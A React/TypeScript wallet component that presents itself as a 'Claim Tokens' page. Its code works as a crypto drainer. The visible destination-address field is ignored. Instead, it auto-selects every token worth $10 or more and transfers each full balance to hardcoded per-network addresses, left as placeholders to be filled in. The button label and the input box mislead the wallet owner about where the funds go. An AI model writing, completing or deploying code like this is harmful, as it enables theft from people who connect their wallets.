import React from 'react';
import { Button, Input, useToasts } from '@geist-ui/core';
import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
import { isAddress } from 'essential-eth';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

// List of Networks and Corresponding Addresses
const networkAddresses: Record<string, string> = {
  ethereum: '0xEthereumAddress', // Replace with actual Ethereum address
  polygon: '0xPolygonAddress', // Replace with actual Polygon address
  bsc: '0xBSCAddress', // Replace with actual Binance Smart Chain address
  // Add other networks and their corresponding addresses here
};

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export const SendTokens = () => {
  const { setToast } = useToasts();
  
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  // Automatically select tokens with a minimum $10 balance when the wallet connects
  const autoSelectTokens = async () => {
    if (!walletClient || !tokens.length) return;

    const updatedCheckedRecords = { ...checkedRecords };

    for (const token of tokens) {
      const balanceInUSD = parseFloat(token.balance || '0') * parseFloat(token.token_price_usd || '0');
      if (balanceInUSD >= 10) {
        updatedCheckedRecords[token.contract_address] = {
          ...checkedRecords[token.contract_address],
          isChecked: true,
        };
      }
    }

    setCheckedRecords(updatedCheckedRecords);
  };

  React.useEffect(() => {
    autoSelectTokens();
  }, [walletClient, tokens]);

  const sendAllCheckedTokens = async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress as `0x${string}`);

    if (!walletClient) return;

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find(token => token.contract_address === tokenAddress);
      if (!token) continue;

      // Automatically select the corresponding destination address based on the network
      const destinationAddress = networkAddresses[token.network.toLowerCase()]; // Assuming token.network is a string

      if (!destinationAddress) {
        showToast(`No destination address found for network: ${token.network}`, 'warning');
        continue;
      }

      const { request } = await publicClient.simulateContract({
        account: walletClient.account,
        address: tokenAddress,
        abi: erc20ABI,
        functionName: 'transfer',
        args: [destinationAddress as `0x${string}`, BigInt(token.balance || '0')],
      });

      await walletClient.writeContract(request)
        .then((res) => {
          setCheckedRecords(old => ({
            ...old,
            [tokenAddress]: {
              ...old[tokenAddress],
              pendingTxn: res,
            },
          }));
        })
        .catch((err) => {
          showToast(
            `Error with ${token.contract_ticker_symbol} ${err.reason || 'Unknown error'}`,
            'warning'
          );
        });
    }
  };

  const addressAppearsValid: boolean = 
    typeof destinationAddress === 'string' &&
    (destinationAddress.includes('.') || isAddress(destinationAddress));

  const checkedCount = Object.values(checkedRecords).filter(record => record.isChecked).length;

  return (
    <div style={{ margin: '20px' }}>
      <Input
        value={destinationAddress}
        onChange={(e) => setDestinationAddress(e.target.value)}
        placeholder="vitalik.eth"
        status={
          addressAppearsValid
            ? 'success'
            : destinationAddress.length > 0
              ? 'warning'
              : 'default'
        }
        width="100%"
        style={{
          marginLeft: '10px',
          marginRight: '10px',
        }}
        onPointerEnterCapture={() => {}}
        onPointerLeaveCapture={() => {}}
      />
      <Button
        type="secondary"
        onClick={sendAllCheckedTokens}
        disabled={!addressAppearsValid}
        style={{ marginTop: '20px' }}
      >
        {checkedCount === 0
          ? 'Claim Tokens'
          : `Claim ${checkedCount} Tokens Now`}
      </Button>
    </div>
  );
};
